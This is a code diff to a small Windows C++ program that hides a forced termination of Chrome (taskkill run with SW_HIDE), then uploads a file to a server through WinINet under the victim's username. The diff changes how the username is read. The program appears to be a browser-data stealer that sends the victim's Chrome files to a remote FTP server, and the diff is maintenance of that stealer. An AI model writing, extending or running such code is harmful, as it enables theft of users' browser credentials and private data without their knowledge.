@@ -1,7 +1,9 @@
-
 #include <sstream>
 #include <wininet.h>
 #include <windows.h>
+#define UNLEN       256 
+
+
 #pragma comment(lib, "Wininet.lib")
 void UploadToServer(const char* file, const char* ftpname)
 {
@@ -14,14 +16,10 @@ void UploadToServer(const char* file, const char* ftpname)
 }
 std::string toStr()
 {
-    const char* ftpname = getenv("USERNAME");
-    if(ftpname == NULL)
-    {
-        return "FAILED_TO_GET_USERNAME";
-    } else {
-        std::string nm(ftpname);
-        return nm;
-    }
+    DWORD len = UNLEN + 1;
+    char username[UNLEN + 1];
+    GetUserNameA(username, &len);
+    return std::string(username);
 }
 
 int main() {
@@ -36,9 +34,7 @@ int main() {
             WinExec("taskkill /IM chrome.exe /F", SW_HIDE);
             UploadToServer(fpath.str().c_str(), toStr().c_str());
             break;
-        } else {
-            // Do nothing..
-        }
+        } 
     }
     return 0;
 }
